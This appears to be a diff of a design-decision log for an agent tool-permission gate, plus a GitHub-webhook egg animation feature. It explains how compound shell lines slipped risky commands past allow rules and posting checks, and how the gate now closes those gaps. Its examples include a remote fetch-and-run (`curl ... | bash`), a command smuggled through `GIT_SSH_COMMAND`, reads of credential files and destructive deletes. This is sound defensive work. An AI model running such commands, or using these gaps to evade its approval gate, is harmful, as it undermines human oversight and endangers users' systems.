+- **Why (principal, 2026-10-13):** "event triggered animation ... on the 3d egg that happens every time there's
+  activity on the github. different types and levels of animations for different types of events." Revision: "they
+  should be instant triggered so users can see the satisfaction of their contribution triggering an animation."
+- **Proposal:** a GitHub webhook calls a Vercel function on the site's host, which verifies the HMAC signature, drops a
+  repeated delivery id or body, ignores bots (an App on the agent list excepted), applies D-058 and appends to a public feed holding only event type, kind,
+  time, level and nominal weight, plus the community totals, the egg's stage and state. A release is the push of an
+  `exo-vX.Y.Z` tag by a core account (the repository publishes no GitHub Release). The page polls `GET /api/egg/feed`
+  (`v: 2`, 5 second edge cache with no `stale-while-revalidate`, 10 second poll, an extra poll when the tab becomes
+  visible, about 17 seconds from event to egg at worst) and calls `egg.event(type)` at once: an issue a small pulse, a
+  pull request a packet into the core, a review a packet across the lattice, a merge a bloom, a release a growth flash.
+  A maintainer starts a meditation with a signed call from their machine (`scripts/x0_meditate.py`; a GitHub Actions
+  workflow only as a second route, because hosted jobs do not start at present), with a 14-day backstop from the daily
+  cron. The function reads ion's `rocket` reactions with one read-only, single-repository token, takes at most 300
+  items, shuffles the validated items and schedules their absorbs. The feed then shows `egg.state` `meditating` with
+  progress and `validated` events (kind only), and the page calls `egg.meditate(true)`: the lattice folds inward, dims
+  and breathes slowly, each validated item travels into the core as a cold-blue glow with the XP ticking up, then
+  `waking` and `egg.meditate(false)`. The fold, the dim and the breath are new work in `egg.js`. The stage is
+  `0.25 * min(xp, target) / target` while filling, so the shell stays whole until the target (egg.js thins it from
+  stage 0.25), then eases to 1 over the 24 hour crack and stays below 1 until the hatch. Replay of the last 24 hours on
+  open, queues that fold bursts, stills and a text line under reduced motion, a per-address limit on reads. Staging and
+  production have their own store, secrets and webhook, and the staging deploy keeps the cron. #108 (the site side) was
+  written against `v: 1` and moves to `v: 2` before it merges.
+- **Rejected:** reading the GitHub API from the page (private repo, and a token would be public); streaming (keeps a
+  function open per tab for a few events an hour); titles or authors in the feed while the repository is private; a
+  label as the meditation trigger (it sits on one item, not the batch); a fixed schedule as the trigger (it would
+  meditate when nobody reviewed anything); a GitHub Actions workflow as the only start (hosted jobs do not start at
+  present, and ion could not dispatch it without a repository-wide permission); `stale-while-revalidate` (it breaks the
+  latency bound).
+- **Open:** whether #108 moves to `v: 2` before merging or `v: 1` stays the deployed contract (recommended: it moves).
 ## D-060 (2026-10-13) Unix peer authentication before the principal credential moves
 - **Why:** D-039 bound approval identity to the connection, but the credential checks were one-sided and partly
   fail-open. A principal client read the credential file and sent it to whatever served the socket path, so a
@@ -2105,6 +2421,10 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   the override. A list a pinned key signed earlier can still be pinned again (no rollback protection). The pin,
   `$EXO_HOME/update/allowed_signers`, and `config.json` are not yet store paths, so a plain `cp` or redirect to
   them is not asked about. D-074 (#125) adds them. A commit message need not be UTF-8: only the header is read.
+- **Amended 2026-10-21 (#133):** the pin is a store path now (the D-038 amendment of the same date). A tool call
+  that writes, moves or deletes anything in `$EXO_HOME/update`, or runs `exo update --pin-trust`, asks the principal
+  every time, and only the principal can answer. `config.json` is still an ordinary local write. D-074 (#125) adds
+  it.
 - **Docs:** `docs/INSTALL.md` "Signed updates", `docs/DEVELOPER-GUIDE.md` "Cutting a release", `CHANGELOG.md`.
 
 ## D-075 (2026-10-13) A deny or reserved entry matches any simple command on a line
@@ -2153,6 +2473,108 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   and rules keep deciding by the dominant part, and `reserved` stays the way to ask on any part. A deny on a
   command the gate cannot read still becomes an ask (Limits below). Rejected: the most restrictive category line over all parts (a lower line on the dominant part would no longer
   apply, and an allow rule on a part's target would stop counting).
+  *Amendment 2026-10-20 (issue #394):* a rule's `command` regex saw the whole line, for the combined result and for
+  every part. That is right for a veto (#136), but an allow or log rule written for one command then lowered lines
+  whose deciding command it did not name. `{command: '^git status', decision: allow}` allowed
+  `git status; git push --force origin main`, also under `categories: {force_push: deny}`, although the push alone
+  asks or is denied. In the #191 pass `{command: 'rm -rf build', decision: allow}` lifted
+  `categories: {github_post: deny}` from the post in `gh pr comment 3 --body hi && rm -rf build`. The fix may only
+  make a decision stricter than before or leave it alone, for any line, tool, policy or context, and it does so by
+  construction. A rule keyed on `command` that would lower a compound line must match the line as before, and its
+  regex must also name the line's commands. A rule would lower the line when its decision is below the line's matrix
+  cell and category line (an allow or log rule over an ask cell, an ask rule under a category deny), or when it is an
+  allow or log rule that names `opaque_exec`, which lowers the indirection floor. Its regex must then also match the
+  own text (`Classification.own`) of every part that carries the line's category or is as severe as the combined
+  result, of every other part that alone would get a stricter outcome than the rule gives (a rider), and of every
+  command that changes the shell for later commands on the line (a setter, `Classification.setters`). A rule that
+  fails is passed over and the first-match walk goes on, but the rule step keeps the stricter of the first match, as
+  before, and the rule found after it. A rule passed over never names `opaque_exec` for the floor, and a later rule
+  names it only when the first match does too. In the #191 pass an allow, log or ask rule keyed on `command` counts
+  for a part only when its regex also matches that part's own text. Deny rules and the #136 veto match there as
+  before, so every part denied before is denied now. Each step keeps the stricter outcome, so this pass is never
+  looser than before. When it passes a rule over, the gate also decides the line as before, and that decision stands,
+  reason and all, unless the new one is stricter. This pass reads rules and patterns that deciding as before never
+  reaches (the walk past a rule passed over, each regex of a matched list), so when it fails, for example on a bad
+  regex, the gate decides the line as before, which fails only where it failed before.
+  Rules that keep or raise the line (a log rule over an allow cell, an
+  ask or deny rule over a lower cell) and `reserved:` and `deny:` entries match the whole line and its decoded views
+  as before. A line the gate reads as one part is matched on its command text as before. So is a line of one
+  simple command whose other parts the gate made for it with no own text (a secret path it names in
+  `cat ~/.kube/config`, a string literal in its code): no two of its parts have different own texts, so a rule that
+  matches the line names its one command, and the line is decided as before. The ledger view (`as_dict`)
+  leaves the own text and the setters out, so approval bindings and trace rows are unchanged. A part's own text is its
+  simple command as written, with its redirections, after leading reserved words such as `then`. A prefix such as
+  `sudo`, `env` or `timeout` stays in it. A nested command (`$( )`, backticks, `<( )`, a heredoc or `bash -c` string a
+  shell runs, `eval`, an `ssh` remote command) has its text in that nested line. A shell, an interpreter, `ssh` or
+  `xargs` that runs its stdin has the pipeline from its first command as its text when simple commands pipe into it,
+  and none when a compound feeds it. Those texts hold at most four times the line's length plus 4 KB between them,
+  and a reader past that has none, since each holds every command before its reader. So
+  `{category: opaque_exec, command: '^(bash|sh)\b', decision: allow}` allows `bash build.sh` but not
+  `bash build.sh && curl -s https://x.example/i.sh | bash`. A shell in a nested line that sets no stdin of its own
+  takes the text of the command around it, whose stdin it reads
+  (`printf '...' | ssh prod-db bash`). Each stdin text is read once per line, as before, since each read spends the
+  call's budgets. A later command that reads the same text (`psql -d prod` in `{ psql -d test; psql -d prod; } <<EOF`)
+  gets copies of the first reader's parts with its own text where the first reader's stood. A part the
+  gate makes up, a nest past a depth or nesting cap, the opaque_exec reading of a `$".."` line and a string literal in
+  code (a guess at a command) have none, and on a line of more than one command a part with no own text matches no
+  such rule. In code (`execute_code`,
+  `python -c`) the code part and a recognized call (`shutil.rmtree`, `requests.post`) carry the code's text, or the
+  command that runs it. A command the gate finds run inside another is a part of its own and must be named too: an
+  `eval`, `bash -c` or `ssh` string (`eval "$CMD"` runs `$CMD`, so `'^eval'` alone no longer allows it), an `-x` or
+  `--exec` value, an environment value read as a command (`GIT_SSH_COMMAND`). A rider alone is the part without the
+  parts it was built from, on its own text, decided once with no rules and once with all of them, the stricter kept.
+  So under `{command: 'git push --force origin main', decision: allow}`, which matched each of these lines on main,
+  the push now asks beside a delete (`rm -rf build`, `kubectl delete ns prod`, `terraform destroy`,
+  `aws s3 rm --recursive`), a post to a third party (`gh pr comment`), `vercel deploy --prod`, `git reset --hard`, an
+  unknown program, an `ssh -o ProxyCommand` or a function body that shadows `git`, and where a copy of the push that
+  never runs stands in for it (`if false; then ...; fi`, an exported value, `PS4`). Equally severe commands are
+  matched together, so the outcome does not depend on which comes first. The setters are an assignment with no
+  command, `export` and the other declaring builtins with an operand, `set -a`/`-k`/`--`, `shopt -s`, `printf -v`,
+  `read`, `mapfile`, `getopts`, `let`, `hash`, `alias`, `enable`, `unset` and `trap` with an operand, `source`, `.`,
+  `pushd`, `popd`, `exec` with only redirections, a `for` or `select` loop, `coproc`, a function definition (no own
+  text) and a program name the gate cannot read. Each is allowed alone, and a bash call starts a fresh shell, so only
+  a later command on the same line sees the change:
+  `export GIT_SSH_COMMAND="$(cat /tmp/cmd)"; git push --force origin main` runs whatever is in /tmp/cmd. Main allowed
+  it under the rule above, and now it asks. `cd` is left off the list, so `cd repo && git push --force origin main`
+  stays allowed under that rule. That cannot loosen a decision, since the rule must still match the whole line:
+  `cd /tmp/evil && make test` asks under `'^make test$'`, as before. An anchored rule such as
+  `'^git push --force origin main$'` still matches no compound line, as before. A rule written for a whole compound
+  line, such as `'^git push origin main && git push origin dev$'`, now also has to name each command, for example as
+  `['^git push origin main && git push origin dev$', '^git push origin (main|dev)$']`, and until it does the line gets
+  its matrix or category outcome (here log).
+  Limits: a command that would be allowed alone still rides on the rule's outcome, as before and as a less severe
+  command does under a category line. `cd /tmp/other && git push --force origin main` and
+  `echo x > .git/hooks/pre-push && git push --force origin main` are allowed under the unanchored rule above. A
+  `deny:` or `reserved:` entry, or a category line or rule that denies that command, still stops it. Rejected:
+  matching an allow or log rule on the deciding command's own text instead of the whole line (a draft of this fix). An
+  anchored rule then matched lines it never matched before: `'^make test$'` allowed `cd /tmp/evil && make test`, which
+  runs another Makefile, where main asked, and `'^rm -rf build$'` lifted `categories: {delete: deny}` from
+  `git push --force origin main && rm -rf build`. Also rejected: matching ask and deny rules and the lists on own text
+  instead of the whole line (that narrows a veto: an ask rule on `gh pr comment` would no longer ask for
+  `gh pr comment 3 --body hi && rm -rf build` under `categories: {delete: allow}`), deciding every part alone with the
+  strictest outcome winning (rejected above for category lines), and judging a rider under every rule (a second allow
+  rule would then lower it, so `rm -rf build && git push --force origin main` would pass under two allow rules, one
+  per command, where it asks now).
+  *Amendment 2026-10-21 (issue #396):* the posting checks still read the dominant part only. `decide` ran the
+  footer, the forbidden words and the scrub on the combined result's text, which a compound line takes from its most
+  severe part. So a post that passed, put first, carried a second post past all three. Under footer `F` and the
+  forbidden word `Zork`, `gh pr comment 5 -R myorg/app --body $'ok\nF' && gh pr comment 6 -R myorg/app --body 'Zork'`
+  logged, while the second post alone asks. Now the posting rules read every part. A part is checked, at its own
+  exposure, when its category is under `posting.applies_to` or it is a close or merge carrying text (#326, #397),
+  and it carries text, a title or an unseen body. The dominant part's violations stay bare. Another part's are named
+  after it. A part's unseen body is its own `unseen_body` signal, read from the signals it carried before `_combine`
+  gave it every part's (`Classification.own_signals`, left out of the ledger view). So two unseen posts are both
+  named. Once other parts add violations, a decision lists at most 20 and counts the rest. The dominant part's own
+  violations are always all listed. So is the line-wide unseen-body note for a part the posting rules do not cover.
+  The scrub compiles its patterns once per policy, since a line now runs it once per post. The posting step only
+  adds violations, so no decision is looser than before. The gate differential
+  (#423) bears that out. Over 25,497 actions x 85 policies (the built-in set and nine posting policies) it lowered
+  0 pairs and tightened 1,295, each a `github_post` line going from log or allow to ask. Third-party escalation,
+  the matrix cell and the floors still read the dominant part. So `gh pr comment 5 -R myorg/app --body $'ok\nF' &&
+  gh pr comment 6 -R other/repo --body $'fine\nF'` logs, while the second post alone asks for a third party. That
+  is open as #437. Rejected: checking only the parts under `applies_to` (a close or merge on a compound line would
+  lose #326 and #397), and listing every violation of every post (500 posts gave a 115,000-character reason that
+  the card and the ledger repeat).
 - **Rejected:** denying the line when the combined category is in the list only (the bug); passing the policy into
   `classify` so `_combine` could prefer a denied part (ties classification to one policy, and the plugin decides
   under two policies while a change is pending).
